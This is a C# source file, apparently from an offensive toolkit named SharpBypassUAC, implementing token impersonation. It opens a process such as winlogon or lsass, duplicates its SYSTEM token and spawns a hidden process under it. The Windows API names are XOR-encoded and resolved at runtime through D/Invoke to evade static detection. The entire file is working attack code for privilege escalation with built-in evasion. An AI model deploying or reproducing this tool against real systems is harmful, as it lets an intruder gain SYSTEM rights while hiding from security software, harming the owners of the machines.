using System;
using System.Text;
using System.Runtime.InteropServices;

namespace SharpBypassUAC
{
    /// <summary>
    /// Token impersonation via D/Invoke.
    /// Opens a target process, duplicates its token, and creates a new process
    /// running under that token. Requires local admin privileges.
    /// Typical targets: winlogon.exe (SYSTEM), lsass.exe (SYSTEM).
    /// All Win32 APIs resolved at runtime to avoid static P/Invoke entries.
    /// </summary>
    public class TokenImpersonation
    {
        // XOR keys
        private static readonly byte _xk1 = 0x2D; // kernel32 APIs
        private static readonly byte _xk2 = 0x5A; // advapi32 APIs

        // "kernel32.dll" ^ 0x2D
        private static readonly byte[] _s0 = new byte[] { 0x46, 0x48, 0x5F, 0x43, 0x48, 0x41, 0x1E, 0x1F, 0x03, 0x49, 0x41, 0x41 };
        // "OpenProcess" ^ 0x2D
        private static readonly byte[] _s1 = new byte[] { 0x62, 0x5D, 0x48, 0x43, 0x7D, 0x5F, 0x42, 0x4E, 0x48, 0x5E, 0x5E };
        // "CloseHandle" ^ 0x2D
        private static readonly byte[] _s2 = new byte[] { 0x6E, 0x41, 0x42, 0x5E, 0x48, 0x65, 0x4C, 0x43, 0x49, 0x41, 0x48 };
        // "advapi32.dll" ^ 0x5A
        private static readonly byte[] _s3 = new byte[] { 0x3B, 0x3E, 0x2C, 0x3B, 0x2A, 0x33, 0x69, 0x68, 0x74, 0x3E, 0x36, 0x36 };
        // "OpenProcessToken" ^ 0x5A
        private static readonly byte[] _s4 = new byte[] { 0x15, 0x2A, 0x3F, 0x34, 0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29, 0x29, 0x0E, 0x35, 0x31, 0x3F, 0x34 };
        // "DuplicateTokenEx" ^ 0x5A
        private static readonly byte[] _s5 = new byte[] { 0x1E, 0x2F, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x3F, 0x0E, 0x35, 0x31, 0x3F, 0x34, 0x1F, 0x22 };
        // "CreateProcessWithTokenW" ^ 0x5A
        private static readonly byte[] _s6 = new byte[] { 0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29, 0x29, 0x0D, 0x33, 0x2E, 0x32, 0x0E, 0x35, 0x31, 0x3F, 0x34, 0x0D };

        // Constants
        private const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
        private const uint TOKEN_DUPLICATE = 0x0002;
        private const uint TOKEN_QUERY = 0x0008;
        private const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private const uint TOKEN_IMPERSONATE = 0x0004;
        private const uint TOKEN_ALL_ACCESS = TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE;
        private const int SecurityImpersonation = 2;
        private const int TokenPrimary = 1;
        private const uint LOGON_WITH_PROFILE = 1;
        private const uint CREATE_NO_WINDOW = 0x08000000;

        // D/Invoke delegates
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate IntPtr OpenProcessDelegate(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate bool CloseHandleDelegate(IntPtr hObject);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate bool OpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate bool DuplicateTokenExDelegate(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            int ImpersonationLevel,
            int TokenType,
            out IntPtr phNewToken);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        delegate bool CreateProcessWithTokenWDelegate(
            IntPtr hToken,
            uint dwLogonFlags,
            string lpApplicationName,
            string lpCommandLine,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        public static void Run(int pid, string command)
        {
            Console.WriteLine("[*] Token impersonation - target PID: " + pid);

            // Resolve APIs via D/Invoke
            string k32 = W.X(_s0, _xk1);
            string adv = W.X(_s3, _xk2);

            var openProcess = W.G<OpenProcessDelegate>(k32, W.X(_s1, _xk1));
            var closeHandle = W.G<CloseHandleDelegate>(k32, W.X(_s2, _xk1));
            var openProcessToken = W.G<OpenProcessTokenDelegate>(adv, W.X(_s4, _xk2));
            var duplicateTokenEx = W.G<DuplicateTokenExDelegate>(adv, W.X(_s5, _xk2));
            var createProcessWithTokenW = W.G<CreateProcessWithTokenWDelegate>(adv, W.X(_s6, _xk2));

            // Step 1: Open target process
            IntPtr hProcess = openProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[!] OpenProcess failed (error " + Marshal.GetLastWin32Error() + ")");
                Console.WriteLine("[!] Requires local admin privileges");
                return;
            }
            Console.WriteLine("[+] Opened process handle");

            IntPtr hToken = IntPtr.Zero;
            IntPtr hDupToken = IntPtr.Zero;

            try
            {
                // Step 2: Open process token
                if (!openProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken))
                {
                    Console.WriteLine("[!] OpenProcessToken failed (error " + Marshal.GetLastWin32Error() + ")");
                    return;
                }
                Console.WriteLine("[+] Opened process token");

                // Step 3: Duplicate token as primary token
                if (!duplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hDupToken))
                {
                    Console.WriteLine("[!] DuplicateTokenEx failed (error " + Marshal.GetLastWin32Error() + ")");
                    return;
                }
                Console.WriteLine("[+] Token duplicated");

                // Step 4: Create process with duplicated token
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                PROCESS_INFORMATION pi;

                if (!createProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, null, command,
                    CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
                {
                    Console.WriteLine("[!] CreateProcessWithTokenW failed (error " + Marshal.GetLastWin32Error() + ")");
                    return;
                }

                Console.WriteLine("[+] Process created with impersonated token (PID: " + pi.dwProcessId + ")");

                closeHandle(pi.hProcess);
                closeHandle(pi.hThread);
            }
            finally
            {
                if (hDupToken != IntPtr.Zero) closeHandle(hDupToken);
                if (hToken != IntPtr.Zero) closeHandle(hToken);
                closeHandle(hProcess);
            }
        }
    }
}
